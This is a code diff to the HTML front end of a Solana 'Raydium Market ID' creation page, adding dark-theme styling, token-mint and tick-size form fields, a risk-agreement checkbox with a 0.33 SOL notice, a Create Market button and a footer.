@@ -4,30 +4,123 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Raydium Market I.D</title>
-    <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
-    <!-- Custom CSS styling -->
     <style>
-        /* Custom CSS styling */
-        body {
+         body {
             background-color: #121212;
             color: #ffffff;
             font-family: Arial, sans-serif;
         }
+        
         .navbar {
             background-color: #121212 !important;
         }
+        
         .navbar-brand {
             color: #ffffff !important;
             font-weight: bold;
             font-size: 24px;
         }
+        
+        .logo-img {
+            width: 50px;
+            height: auto;
+        }
+        
+        .offcanvas-header {
+            background-color: #121212;
+            color: #ffffff;
+            border-bottom: none;
+        }
+        
+        .offcanvas-body {
+            background-color: #121212;
+            color: #ffffff;
+        }
+        
+        .wallet-adapter-dropdown-list-item {
+            color: #ffffff;
+            cursor: pointer;
+        }
+        
+        .para-note {
+            background-color: #2a2a2a;
+            color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .market-id-h1 {
+            color: #ffffff;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .subheader {
+            background: linear-gradient(to right, #DC1FFF, #00FFA3); /* Gradient from #DC1FFF to #00FFA3 */
+            -webkit-background-clip: text; /* Clip text to background */
+            -webkit-text-fill-color: transparent; /* Make text transparent */
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .market-id-h3 {
+            color: #ffffff;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .important {
+            color: red;
+        }
+        
+        .card-block {
+            background-color: #2a2a2a;
+            color: #ffffff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .form-label {
+            color: #ffffff;
+        }
+        
+        .form-control {
+            background-color: #333333;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            width: 100%;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .btn-close {
+            color: #ffffff;
+            opacity: 0.5;
+        }
+        
+        .btn-close:hover {
+            opacity: 1;
+        }
+
         .phantom-connect {
             position: absolute;
             top: 20px;
             right: 20px;
         }
-        /* Add your other CSS styles here */
+        
+        .confirm-btn {
+            margin-top: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -73,7 +166,76 @@
         </div>
     </div>
 
-    <!-- More Content Sections... -->
+    <div class="container mt-100px mb-5">
+        <!-- Content section 2 -->
+        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
+            <div class="row">
+                <div class="col-lg-4 col-12">
+                    <div class="mt-1"> Mints </div>
+                    <div class="text-white-50">Configure the mints for the tokens you want to create a market for.</div>
+                </div>
+                <div class="col-lg-8 col-12">
+                    <form class="row g-3 needs-validation" novalidate="">
+                        <div class="col-md-12">
+                            <label for="BaseMint" class="form-label">Base Mint (Your token address)</label>
+                            <input type="text" class="form-control" id="BaseMint" required="" value=""/>
+                            <div class="valid-feedback">Looks good!</div>
+                        </div>
+                        <div class="col-md-12">
+                            <label for="QuoteMint" class="form-label">Quote Mint (SOL token is the default)</label>
+                            <input type="text" class="form-control" id="QuoteMint" required="" value="So11111111111111111111111111111111111111112"/>
+                            <div class="valid-feedback">Looks good!</div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container mt-100px mb-5">
+        <!-- Content section 3 -->
+        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
+            <div class="row">
+                <div class="col-lg-4 col-12">
+                    <div class="mt-1"> Tickers </div>
+                    <div class="text-white-50">Configure the tick sizes, or lowest representable quantities of base and quote tokens.</div>
+                </div>
+                <div class="col-lg-8 col-12">
+                    <form class="row g-3 needs-validation" novalidate="">
+                        <div class="col-md-12">
+                            <label for="Min. Order Size" class="form-label">Min. Order Size</label>
+                            <input type="text" class="form-control" id="BaseMint" required="" value=""/>
+                            <div class="valid-feedback">Looks good!</div>
+                        </div>
+                        <div class="col-md-12">
+                            <label for="PriceTick" class="form-label">Price Tick</label>
+                            <input type="text" class="form-control" id="QuoteMint" required="" value=""/>
+                            <div class="valid-feedback">Looks good!</div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container mt-100px mb-5">
+        <!-- Content section 4 -->
+        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
+            <div class="form-check">
+                <input class="form-check-input" type="checkbox" value="" id="riskAgreement">
+                <label class="form-check-label" for="riskAgreement">Risk Agreement</label>
+                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong><FONT COLOR=ff0000>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
+            </div>
+            <div class="container confirm-btn">
+                <button class="btn btn-primary create-market">Create Market</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="color-footer bg-body-tertiary text-center text-lg-start">
+        <div class="text-center p-3">Copyright © 2024 Raydium Market ID. All rights reserved.</div>
+    </footer>
 
     <!-- JavaScript Libraries -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
